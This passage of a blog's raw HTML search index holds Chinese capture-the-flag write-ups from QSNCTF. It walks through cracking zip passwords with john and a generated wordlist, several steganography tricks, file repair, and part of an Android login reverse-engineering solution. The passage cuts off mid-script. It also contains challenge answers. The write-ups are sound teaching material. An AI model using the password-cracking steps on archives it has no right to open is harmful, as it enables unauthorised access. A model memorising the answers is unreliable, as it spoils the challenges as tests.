class="built_in">print</span>(m)</span><br><span class="line"><span class="comment"># print(images)</span></span><br></pre></td></tr></table></figure><p>结果如下：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221007235333510.png" alt="image-20221007235333510"></p><p>最后发现交不了，经过群友们的友好提示，类UUID格式，这里得到的flag少了一个<code>-</code>，最后结果应该为：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qsnctf&#123;06xxxxxx-f6cb-c84a-04fe&#125;</span><br></pre></td></tr></table></figure><blockquote><p>给的题目并不能扫出最后一个<code>-</code>，应该是这题的bug</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> Crypto </tag>
            
            <tag> QSNCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[青少年CTF]misc-Simpleness</title>
      <link href="/2022/10/07/e4a98e289670-q1jun/"/>
      <url>/2022/10/07/e4a98e289670-q1jun/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-题目"><a href="#0x01-题目" class="headerlink" title="0x01 题目"></a>0x01 题目</h2><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221007220707611.png" alt="image-20221007220707611"></p><p>附件：simpleness .zip</p><h2 id="0x02-解题"><a href="#0x02-解题" class="headerlink" title="0x02 解题"></a>0x02 解题</h2><p>这题包含的知识点比较多，写wp真是累死我了，看过的师傅在下面留下点评论呗🥹</p><h3 id="0x0201-弱口令爆破"><a href="#0x0201-弱口令爆破" class="headerlink" title="0x0201 弱口令爆破"></a>0x0201 弱口令爆破</h3><p>解压了simpleness.zip，发现一共有三个文件：</p><ul><li>flag.zip</li><li>hint.zip</li><li>key.zip</li></ul><p>放到kali里面使用john进行爆破：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221007221156285.png" alt="image-20221007221156285"></p><p>hint.zip的解压密码为: <strong>123456</strong></p><p>其他两个包跑了一好一会儿没跑出来，那就先分析hint.zip里面的文件。</p><h3 id="0x0202-RAR伪加密"><a href="#0x0202-RAR伪加密" class="headerlink" title="0x0202 RAR伪加密"></a>0x0202 RAR伪加密</h3><p>hint.zip里面解出两个文件：</p><ul><li>hint.png</li><li>hint.rar</li></ul><p>这个hint.rar是伪加密，随便打开一个十六进制的编辑器：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221007222530330.png" alt="image-20221007222530330"></p><p>找到第24个字节，这里的<code>0x24</code>表示已加密，改成<code>0x20</code>表示未加密，改完：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221007222739455.png" alt="image-20221007222739455"></p><p>保存之后，成功解压hint.rar，得到一个hint.txt:</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221007222916489.png" alt="image-20221007222916489"></p><p>这里得到</p><blockquote><p>提示1：key.zip的密码范围是qsnctf大小写，且此密码可多次使用</p></blockquote><blockquote><p>提示2：要用到SilentEye0.3.1这个工具（之前做的时候没有这个提示，卡了好久</p></blockquote><h3 id="0x0203-图片隐写"><a href="#0x0203-图片隐写" class="headerlink" title="0x0203 图片隐写"></a>0x0203 图片隐写</h3><p>再看<strong>第二个文件</strong>：hint.png</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221007223207637.png" alt="image-20221007223207637"></p><p>是一张平平无奇的png图片，但是丢到foremost看一下发现里面藏了个zip</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Foremost version 1.5.7 by Jesse Kornblum, Kris Kendall, and Nick Mikus</span><br><span class="line">Audit File</span><br><span class="line"></span><br><span class="line">Foremost started at Fri Oct  7 22:33:18 2022</span><br><span class="line">Invocation: foremost -i hint.png </span><br><span class="line">Output directory: /root/q1jun/markdown/simpleness/hint/output</span><br><span class="line">Configuration file: /etc/foremost.conf</span><br><span class="line">------------------------------------------------------------------</span><br><span class="line">File: hint.png</span><br><span class="line">Start: Fri Oct  7 22:33:18 2022</span><br><span class="line">Length: 82 KB (84884 bytes)</span><br><span class="line"> </span><br><span class="line">Num Name (bs=512)       Size File Offset Comment </span><br><span class="line"></span><br><span class="line">0:00000162.zip        1 KB       83284  </span><br><span class="line">1:00000000.png       81 KB           0   (371 x 225)</span><br><span class="line">Finish: Fri Oct  7 22:33:18 2022</span><br><span class="line"></span><br><span class="line">2 FILES EXTRACTED</span><br><span class="line"></span><br><span class="line">zip:= 1</span><br><span class="line">png:= 1</span><br><span class="line">------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Foremost finished at Fri Oct  7 22:33:18 2022</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foremost -i hint.png</span><br></pre></td></tr></table></figure><p>提取出zip文件，解压发现没有密码，得到一张二维码：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221007223553067.png" alt="image-20221007223553067"></p><p>使用工具扫码得到另一个hint：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221007223650243.png" alt="image-20221007223650243"></p><blockquote><p>提示3：最后一个压缩包是中文</p></blockquote><h3 id="0x0204-python生成字典爆破"><a href="#0x0204-python生成字典爆破" class="headerlink" title="0x0204 python生成字典爆破"></a>0x0204 python生成字典爆破</h3><p>通过<code>提示1</code>，我们可以知道key.zip的密码是<strong>qsnctf</strong>的大小写组合，通过写python脚本生成一个字典：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿localhost)-[~/q1jun/markdown/simpleness]</span><br><span class="line">└─# cat wordlist.txt </span><br><span class="line">qsnctf</span><br><span class="line">qsnctF</span><br><span class="line">qsncTf</span><br><span class="line">qsncTF</span><br><span class="line">qsnCtf</span><br><span class="line">qsnCtF</span><br><span class="line">qsnCTf</span><br><span class="line">qsnCTF</span><br><span class="line">qsNctf</span><br><span class="line">qsNctF</span><br><span class="line">qsNcTf</span><br><span class="line">qsNcTF</span><br><span class="line">qsNCtf</span><br><span class="line">qsNCtF</span><br><span class="line">qsNCTf</span><br><span class="line">qsNCTF</span><br><span class="line">qSnctf</span><br><span class="line">qSnctF</span><br><span class="line">qSncTf</span><br><span class="line">qSncTF</span><br><span class="line">qSnCtf</span><br><span class="line">qSnCtF</span><br><span class="line">qSnCTf</span><br><span class="line">qSnCTF</span><br><span class="line">qSNctf</span><br><span class="line">qSNctF</span><br><span class="line">qSNcTf</span><br><span class="line">qSNcTF</span><br><span class="line">qSNCtf</span><br><span class="line">qSNCtF</span><br><span class="line">qSNCTf</span><br><span class="line">qSNCTF</span><br><span class="line">Qsnctf</span><br><span class="line">QsnctF</span><br><span class="line">QsncTf</span><br><span class="line">QsncTF</span><br><span class="line">QsnCtf</span><br><span class="line">QsnCtF</span><br><span class="line">QsnCTf</span><br><span class="line">QsnCTF</span><br><span class="line">QsNctf</span><br><span class="line">QsNctF</span><br><span class="line">QsNcTf</span><br><span class="line">QsNcTF</span><br><span class="line">QsNCtf</span><br><span class="line">QsNCtF</span><br><span class="line">QsNCTf</span><br><span class="line">QsNCTF</span><br><span class="line">QSnctf</span><br><span class="line">QSnctF</span><br><span class="line">QSncTf</span><br><span class="line">QSncTF</span><br><span class="line">QSnCtf</span><br><span class="line">QSnCtF</span><br><span class="line">QSnCTf</span><br><span class="line">QSnCTF</span><br><span class="line">QSNctf</span><br><span class="line">QSNctF</span><br><span class="line">QSNcTf</span><br><span class="line">QSNcTF</span><br><span class="line">QSNCtf</span><br><span class="line">QSNCtF</span><br><span class="line">QSNCTf</span><br><span class="line">QSNCTF</span><br></pre></td></tr></table></figure><p>python脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">S = <span class="string">&#x27;qsnctf&#x27;</span></span><br><span class="line">word = <span class="string">&#x27;&#x27;</span></span><br><span class="line">ans = [S]</span><br><span class="line">word = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(S)):</span><br><span class="line">    s = S[i]</span><br><span class="line">    <span class="keyword">if</span> s.isalpha():</span><br><span class="line">        new = []</span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> ans:</span><br><span class="line">            new.append(a[:i] + s.lower() + a[i + <span class="number">1</span>:])</span><br><span class="line">            new.append(a[:i] + s.upper() + a[i + <span class="number">1</span>:])</span><br><span class="line">        ans = new</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> ans:</span><br><span class="line">    word += <span class="string">&#x27;&#x27;</span>.join(a)</span><br><span class="line">    word += <span class="string">&#x27;&#x27;</span>.join(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;wordlist.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(word)</span><br><span class="line">    f.close</span><br></pre></td></tr></table></figure><p>使用zip2john生成压缩包的hash：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip2john key.zip &gt;&gt; key.txt</span><br></pre></td></tr></table></figure><p>使用john根据上面生成的字典<strong>wordlist.txt</strong>进行爆破：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john key.txt --wordlist=wordlist.txt</span><br></pre></td></tr></table></figure><p>立马得到压缩包key.zip的密码：<code>QsNcTf</code></p><p>解压得到一个bmp文件：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221007224516894.png" alt="image-20221007224516894"></p><h3 id="0x0205-LSB-AES隐写"><a href="#0x0205-LSB-AES隐写" class="headerlink" title="0x0205 LSB+AES隐写"></a>0x0205 LSB+AES隐写</h3><p>看到bmp格式的图片，第一个想到这是LSB隐写，但是当我分析完了R- G- B低位隐写的所有数据之后并没有发现什么有用的东西。</p><p>想到前面的提示2：是用<strong>SilentEye0.3.1</strong>这个工具进行隐写的，用这个工具进行decode：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221007225202925.png" alt="image-20221007225202925"></p><p>还是不行。</p><p>想到前面的提示1说到<code>QsNcTf</code>这个密码可以多次使用，勾选<kbd>Encrypted data</kbd>使用AES128进行解密：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221007225430633.png" alt="image-20221007225430633"></p><p>发现图片里面隐藏了一个<code>1.txt</code>文件，提取出来：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221007225608706.png" alt="image-20221007225608706"></p><h3 id="0x0206-零宽隐写"><a href="#0x0206-零宽隐写" class="headerlink" title="0x0206 零宽隐写"></a>0x0206 零宽隐写</h3><p>发现直接看并没有什么有用的信息，用Sublime text打开之后发现：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221007225640079.png" alt="image-20221007225640079"></p><p>发现是个零宽隐写。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221007225750759.png" alt="image-20221007225750759"></p><p>这里有个坑，这个网站并不能正确的现实里面隐藏的内容，</p><p>换了个网站:<a target="_blank" rel="noopener" href="https://yuanfux.github.io/zero-width-web/">Zero Width Lib (yuanfux.github.io)</a></p><p>发现了里面隐藏的内容：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221007225912594.png" alt="image-20221007225912594"></p><p>这里得到了<code>flag.zip</code>的密码，但是试了半天<code>Hello World</code>，发现并不能解开压缩包</p><p>最后发现密码是这一整句话。。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The password is Hello World</span><br></pre></td></tr></table></figure><h3 id="0x0207-SNOW-无字天书"><a href="#0x0207-SNOW-无字天书" class="headerlink" title="0x0207 SNOW-无字天书"></a>0x0207 SNOW-无字天书</h3><p>解压flag.zip之后，以为马上拿到了flag准备提交，结果发现又给了两个文件（我快崩溃了</p><ul><li>flag.zip</li><li>key.txt</li></ul><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221007230526111.png" alt="image-20221007230526111"></p><p>打开key.txt后，发现什么也没有</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221007230602577.png" alt="image-20221007230602577"></p><p>想到可能是SNOW的无字天书隐写，因为里面有很多空白制表符，但是没有任何内容。</p><p>通过<code>SNOW.exe</code>工具解出一串数字：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221007230722671.png" alt="image-20221007230722671"></p><h3 id="0x0208-中文电码解码"><a href="#0x0208-中文电码解码" class="headerlink" title="0x0208 中文电码解码"></a>0x0208 中文电码解码</h3><p>得到一串数字：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">66382508137843160834</span><br></pre></td></tr></table></figure><p>想到提示3: <strong>最后一个压缩包的密码是中文</strong> ,想到这可能是中文电码（因为要让它变成汉字</p><p>打开中文电码查询网站：<a target="_blank" rel="noopener" href="http://code.mcdvisa.com/">中文电码查询 Chinese Commercial Code</a></p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221007231029902.png" alt="image-20221007231029902"></p><p>得到最后一个压缩包的密码：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这是密码吗</span><br></pre></td></tr></table></figure><p>解开最后一个flag.zip之后发现….又是一张图片<code>flag.jpg</code>！</p><h3 id="0x0209-JPG文件修复"><a href="#0x0209-JPG文件修复" class="headerlink" title="0x0209 JPG文件修复"></a>0x0209 JPG文件修复</h3><p>发现flag.jpg并不能打开，丢到十六进制编辑器里面：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221007231343379.png" alt="image-20221007231343379"></p><p>在文件末尾，看到这些乱码是文件被逆序，而且奇偶互换了</p><p>通过python写一个脚本进行修复，脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="built_in">open</span>(<span class="string">&quot;flag.jpg&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">a = <span class="built_in">open</span>(<span class="string">&quot;flag1.jpg&quot;</span>,<span class="string">&quot;wb&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span> ,<span class="built_in">len</span>(s), <span class="number">4</span>):<span class="comment">#4位奇偶互换</span></span><br><span class="line">    s1 = s[i:i+<span class="number">4</span>][::-<span class="number">1</span>]</span><br><span class="line">    a.write(s1)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="built_in">open</span>(<span class="string">&quot;flag1.jpg&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()[::-<span class="number">1</span>] <span class="comment">#逆序</span></span><br><span class="line">a = <span class="built_in">open</span>(<span class="string">&quot;flag2.jpg&quot;</span>,<span class="string">&quot;wb&quot;</span>)</span><br><span class="line">a.write(s)</span><br></pre></td></tr></table></figure><p>得到flag2.jpg可以正常打开：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221007231949289.png" alt="image-20221007231949289"></p><h3 id="0x0210-图片宽高隐写"><a href="#0x0210-图片宽高隐写" class="headerlink" title="0x0210 图片宽高隐写"></a>0x0210 图片宽高隐写</h3><p>得到flag2.jpg之后还不能得到flag，分析flag2.jpg也并没有发现里面藏了其他文件。</p><p>想到可能是修改了高度，丢进010Editer：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221007232646601.png" alt="image-20221007232646601"></p><p>找到高度 <code>WORD Y_image</code>，把它改高一点，我这里改成<strong>600</strong>：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221007232735105.png" alt="image-20221007232735105"></p><p>保存后再打开图片，得到flag：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221007232803001.png" alt="image-20221007232803001"></p><blockquote><p>制作writeup不易，师傅们留下点评论或点赞吧🥺</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> Misc </tag>
            
            <tag> QSNCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[青少年CTF]reverse-EzAndroid</title>
      <link href="/2022/10/04/8286824a4caf-q1jun/"/>
      <url>/2022/10/04/8286824a4caf-q1jun/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-题目"><a href="#0x01-题目" class="headerlink" title="0x01 题目"></a>0x01 题目</h2><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221004110017214.png" alt="image-20221004110017214"></p><p>附件是一个apk包</p><h2 id="0x02-解题"><a href="#0x02-解题" class="headerlink" title="0x02 解题"></a>0x02 解题</h2><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221004110409928.png" alt="image-20221004110409928"></p><p>解压apk包之后发现被加密了，用<code>apktools</code>进行解密，然后反编译得到源码：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221004110557664.png" alt="image-20221004110557664"></p><p>找到入口类，在<code>com.example.haveaandroid</code>:</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221004110700416.png" alt="image-20221004110700416"></p><p>源码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.haveaandroid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> androidx.recyclerview.widget.ItemTouchHelper;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes3.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    EditText name;</span><br><span class="line">    EditText pass;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX INFO: Access modifiers changed from: protected */</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="built_in">this</span>.name = (EditText) findViewById(R.id.zhanghao);</span><br><span class="line">        <span class="built_in">this</span>.pass = (EditText) findViewById(R.id.mima);</span><br><span class="line">        <span class="type">Button</span> <span class="variable">button1</span> <span class="operator">=</span> (Button) findViewById(R.id.button1);</span><br><span class="line">        button1.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123; <span class="comment">// from class: com.example.haveaandroid.MainActivity.1</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">mname</span> <span class="operator">=</span> <span class="string">&quot;ccadwjlyah&quot;</span>;</span><br><span class="line">            Integer[] compare = &#123;<span class="number">404</span>, <span class="number">220</span>, <span class="number">436</span>, <span class="number">368</span>, <span class="number">220</span>, <span class="number">436</span>, <span class="number">412</span>, <span class="number">452</span>, <span class="number">432</span>, Integer.valueOf((<span class="type">int</span>) ItemTouchHelper.Callback.DEFAULT_DRAG_ANIMATION_DURATION), <span class="number">412</span>&#125;;</span><br><span class="line">            List&lt;Integer&gt; ccompare = <span class="keyword">new</span> <span class="title class_">ArrayList</span>(Arrays.asList(<span class="built_in">this</span>.compare));</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span> <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">user</span> <span class="operator">=</span> MainActivity.<span class="built_in">this</span>.name.getText().toString().trim();</span><br><span class="line">                <span class="type">String</span> <span class="variable">pwd</span> <span class="operator">=</span> MainActivity.<span class="built_in">this</span>.pass.getText().toString().trim();</span><br><span class="line">                List&lt;Integer&gt; ppwd = MainActivity.change(pwd);</span><br><span class="line">                <span class="keyword">if</span> (user.equals(<span class="built_in">this</span>.mname) &amp;&amp; ppwd.equals(<span class="built_in">this</span>.ccompare)) &#123;</span><br><span class="line">                    Toast.makeText(MainActivity.<span class="built_in">this</span>, <span class="string">&quot;correct！&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">                    <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(MainActivity.<span class="built_in">this</span>, afterlog.class);</span><br><span class="line">                    MainActivity.<span class="built_in">this</span>.startActivity(intent);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                Toast.makeText(MainActivity.<span class="built_in">this</span>, <span class="string">&quot;error！&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> List&lt;Integer&gt; <span class="title function_">change</span><span class="params">(String args)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="type">char</span>[] ch = args.toCharArray();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> c : ch) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">xxx</span> <span class="operator">=</span> (c ^ <span class="number">3</span>) &lt;&lt; <span class="number">2</span>;</span><br><span class="line">            list.add(Integer.valueOf(xxx));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以直接看到打开app之后需要输入登入<code>用户名</code>和<code>密码</code>，其中用户名已经给出:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">mname</span> <span class="operator">=</span> <span class="string">&quot;ccadwjlyah&quot;</span>;</span><br></pre></td></tr></table></figure><p>而密码则通过<code>change</code>函数进行异或和移位进行加密，加密前的密文为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Integer[] compare = &#123;<span class="number">404</span>, <span class="number">220</span>, <span class="number">436</span>, <span class="number">368</span>, <span class="number">220</span>, <span class="number">436</span>, <span class="number">412</span>, <span class="number">452</span>, <span class="number">432</span>, Integer.valueOf((<span class="type">int</span>) ItemTouchHelper.Callback.DEFAULT_DRAG_ANIMATION_DURATION), <span class="number">412</span>&#125;;</span><br></pre></td></tr></table></figure><p>这里面的<code>Integer.valueOf((int) ItemTouchHelper.Callback.DEFAULT_DRAG_ANIMATION_DURATION)</code>是一个常量，通过逆向追踪找到了它的数值：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221004111103976.png" alt="image-20221004111103976"></p><p>将<code>Integer.valueOf((int) ItemTouchHelper.Callback.DEFAULT_DRAG_ANIMATION_DURATION)</code>替换成它的数值，得到了我们寻找的密码密文：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Integer[] compare = &#123;<span class="number">404</span>, <span class="number">220</span>, <span class="number">436</span>, <span class="number">368</span>, <span class="number">220</span>, <span class="number">436</span>, <span class="number">412</span>, <span class="number">452</span>, <span class="number">432</span>, <span class="number">200</span>, <span class="number">412</span>&#125;;</span><br></pre></td></tr></table></figure><p>根据<code>public static List&lt;Integer&gt; change(String args)</code>写出解密脚本：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 